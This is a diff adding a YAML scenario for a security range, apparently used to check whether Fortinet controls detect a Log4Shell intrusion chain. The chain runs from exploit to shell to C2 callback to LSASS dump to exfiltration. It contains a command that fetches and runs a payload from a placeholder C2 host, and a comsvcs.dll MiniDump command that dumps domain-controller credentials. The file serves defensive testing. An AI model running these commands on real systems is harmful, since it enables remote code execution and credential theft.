@@ -1,0 +1,38 @@
+id: S2
+name: "Log4Shell on the app server: shell, credential dump, exfiltration"
+environment: andes-range
+summary: >-
+  A contractor laptop that was already compromised scans the HQ network and finds APP-01's Java
+  portal. A JNDI lookup in a header gives a shell, the shell calls home, the attacker reuses an
+  admin password to dump LSASS on the domain controller and ships the dump out.
+steps:
+  - id: exploit
+    title: Log4Shell against APP-01's portal
+    tactic: Initial Access
+    attack: T1190 Exploit Public-Facing Application
+    do: {attack: {pack: TP-2021-44228, from: CONTRACTOR-LT, to: APP-01, port: 8080}}
+    controls: [FortiGate IPS sensor on the HQ-to-APP policy, FortiGate policy (who may reach APP-01)]
+  - id: shell
+    title: The Java process starts a shell
+    tactic: Execution
+    attack: T1059.004 Unix Shell
+    do: {proc: {host: APP-01, name: sh, parent: java, path: /bin/sh, cmd: "/bin/sh -c curl -s http://{{c2:2}}/x | sh"}}
+    controls: [FortiEDR Execution Prevention (lineage)]
+  - id: callback
+    title: The shell calls home
+    tactic: Command and Control
+    attack: T1071.001 Web Protocols
+    do: {connect: {from: APP-01, to: "c2:2", port: 443, process: curl}}
+    controls: [FortiGate egress policy for servers, FortiGate C2 feed, FortiEDR Exfiltration Prevention]
+  - id: lsass
+    title: LSASS is dumped on DC-01
+    tactic: Credential Access
+    attack: T1003.001 LSASS Memory
+    do: {proc: {host: DC-01, name: rundll32.exe, parent: wmiprvse.exe, path: "C:\\Windows\\System32\\rundll32.exe", cmd: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\d.bin full"}}
+    controls: [FortiEDR Execution Prevention]
+  - id: exfil
+    title: The dump leaves through HTTPS
+    tactic: Exfiltration
+    attack: T1041 Exfiltration Over C2 Channel
+    do: {connect: {from: DC-01, to: "c2:3", port: 443, process: curl.exe}}
+    controls: [FortiGate egress policy for servers, FortiGate C2 feed, FortiEDR Exfiltration Prevention]
